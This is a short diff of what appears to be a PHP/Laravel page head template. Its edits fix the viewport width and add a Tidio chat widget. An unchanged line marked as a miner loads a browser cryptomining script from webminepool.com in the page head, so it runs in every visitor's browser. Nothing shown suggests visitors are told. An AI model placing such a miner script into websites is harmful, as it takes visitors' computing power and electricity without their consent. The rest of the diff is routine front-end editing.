@@ -3,8 +3,10 @@
 
 <head>       
     <meta charset="UTF-8">  
+
+    <meta name="viewport" content="width=1024, initial-scale=1.0">
     <!-- Responsive Meta -->                    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
     
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
@@ -27,6 +29,9 @@
     <script type="text/javascript">
         {<?php echo $settings->tawk_to; ?>}
     </script>
+    <!--Tidio Script-->
+    <script src="//code.tidio.co/xlyfmwcfo55umfpbfzdbf6d7jvuggeit.js" async></script>
+
 
     <!-- Stylesheets Start -->
     <link rel="stylesheet" href="<?php echo e(asset ('home/css/fontawesome.min.css')); ?>" type="text/css"/>
